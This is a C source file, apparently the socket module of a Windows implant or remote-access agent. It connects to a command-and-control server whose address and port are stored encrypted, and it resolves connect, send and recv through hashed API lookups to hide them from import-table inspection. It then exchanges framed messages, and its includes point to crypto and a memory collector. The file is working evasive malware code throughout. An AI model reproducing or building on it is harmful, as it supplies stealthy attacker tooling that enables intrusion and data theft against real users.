#pragma comment(lib, "Ws2_32.lib")
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include <stdio.h>
#include "socketManager.h"
#include "../message/Message.h"
#include "../message/MessageQueue.h"
#include "../Definitions.h"
#include "../importer/Importer.h"
#include "../crypto/Crypto.h"
#include "../memoryCollector/MemoryCollector.h"

SOCKET _initWindowsSocket();

PSOCKET_MANAGER initSocketManager(PMESSAGE_QUEUE queueMessageReceived, PMESSAGE_QUEUE queueMessagesToSend)
{
    SOCKET sock = _initWindowsSocket();
    printf("[+] Socket successfully intialized...\n");
    if(sock == INVALID_SOCKET)
    {
        return NULL;
    }
    PSOCKET_MANAGER sManager = (PSOCKET_MANAGER)allocMemory(sizeof(SOCKET_MANAGER));
    sManager->s = sock;
    sManager->queueMessageReceived = queueMessageReceived;
    sManager->queueMessagesToSend = queueMessagesToSend;
    return sManager;
};

BOOL destroySocketManager(PSOCKET_MANAGER pSockManager)
{

    freeMemory(pSockManager);
    return TRUE;
};

BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
{
    /* INITIALIZE SIZE VARIABLES */
    DWORD size = message->size;
    DWORD sizeToAlloc = size + sizeof(DWORD) + 1; // sizeToAlloc is -> size of the payload + size of a DWORD + SIZE of a char
    /*
    INITIALIZE BUFFER TO SEND WHOLE MESSAGE
    ------------------------------------------
     ------    -------    ------------------- 
    | TYPE |  | PSIZE |  |      PAYLOAD      |
     ------    -------    -------------------
     1 Byte    4 Bytes        PSIZE Bytes
    ------------------------------------------
                  sizeToAlloc
    */
    char* data = (char*)allocMemory(sizeToAlloc);
    if (data == NULL)
    {
        return FALSE;
    }
    
    memcpy(data, &message->type, sizeof(char));
    memcpy((data + 1), &size, sizeof(DWORD));
    memcpy((data + 1 + sizeof(DWORD)), message->payload, size);

    /* OBTAIN OBFUSCTED FUNCTION */
    typedef NTSTATUS(WINAPI* SendToMinic)(
		SOCKET      s,
		char*       buffer,
		int         len,
        int         flags
	);
    SendToMinic sendToMinic =  (SendToMinic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_SEND_FUNCTION);
    sendToMinic(sManager->s, data, sizeToAlloc, 0);
    freeMemory(data);
    freeMessage(message);
    return TRUE;
};

void receiveMessage(PSOCKET_MANAGER sManager)
{   
    /* OBTAIN OBFUSCTED FUNCTION */
    typedef NTSTATUS(WINAPI* RecvFromMinic)(
		SOCKET      s,
		char*       buffer,
		int         len,
        int         flags
	);
    RecvFromMinic recvFromMinic =  (RecvFromMinic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE,  HASH_RECV_FUNCTION);

    /* READING ONE BYTE FOR MESSAGE TYPE */
    char responseType = 0x0;
    if (recvFromMinic(sManager->s, &responseType, sizeof(char), 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };
    
    /* READING PSIZE_FIELD_SIZE BYTES FOR MESSAGE PAYLOAD SIZE FIELD */
    char size[4];
    if (recvFromMinic(sManager->s, size, PSIZE_FIELD_SIZE, 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };

    /* READING payloadSize BYTES FOR MESSAGE PAYLOAD */
    DWORD payloadSize = (size[0] << 24) | (size[1] << 16) | (size[2] << 8) | (size[3]);
    char* buffer = (char*)allocMemory(payloadSize);
    if (recvFromMinic(sManager->s, buffer, payloadSize, 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };

    createMessage(responseType, payloadSize, buffer);

};

SOCKET _initWindowsSocket()
{
    /* INITIALIZE WINDOWS SOCKET STRUCTURES*/
    WSADATA wsaData = {0};
    int sStartUp = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (sStartUp != 0)
    {
        printf("[-] Socket initialization failed -> %i\n", sStartUp);
        return INVALID_SOCKET;
    }

    /* CREATING A WINDOWS SOCKET */
    SOCKET sock = INVALID_SOCKET;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        printf("[-] Socket creation failed -> 0x%i\n", WSAGetLastError());
        return INVALID_SOCKET;
    }

    PCSTR server =  (PCSTR)decrypt(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN));
    PCSTR portStr =  (PCSTR)decrypt(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER));
    u_short port = atoi(portStr);
    freeMemory(portStr);
    
    struct sockaddr_in sockAddr =
    {
        .sin_family = AF_INET, 
        .sin_port = htons(port)
    };

    if (inet_pton(AF_INET, server, &sockAddr.sin_addr) != 1)
    {
        printf("[-] inet_pton failed -> %i\n", WSAGetLastError());
        return INVALID_SOCKET;
    };

    /* OBTAIN OBFUSCTED FUNCTION */
    typedef NTSTATUS(WINAPI* ConnectTominic)(
        SOCKET      s,
        const struct sockaddr *name,
        int         namelen
    );
    ConnectTominic connectToMinic =  (ConnectTominic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_CONNECT_FUNCTION);
    if (connectToMinic(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
    {
        printf("[-] connect failed -> %i\n", WSAGetLastError());
        return INVALID_SOCKET;
    };

    return sock;
}